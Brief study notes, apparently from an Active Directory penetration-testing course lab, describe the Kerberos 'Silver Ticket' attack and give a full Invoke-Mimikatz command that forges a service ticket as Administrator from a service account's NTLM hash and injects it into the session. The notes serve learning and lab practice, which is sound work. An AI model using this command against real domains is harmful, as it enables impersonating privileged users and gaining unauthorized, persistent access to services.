
<center><h1>Abuse 2: Silver Ticket</h1></center>
***If you are not able to dump the hash of krbtgt user then you can use this attack.***

If you can extract NTLM hash of a service account then access the service using any user including high privilege user

> If you have service account NTLM hash

```bash
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063- 538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt"'
```

> Similar command can ve used for any other service ex: HOST, RPCSS, WSMAN and many more.

![[2022-03-25 22_25_24-10-DomainPersistence-Part2.mp4 - VLC media player.png]]

12:02 Part2 DP

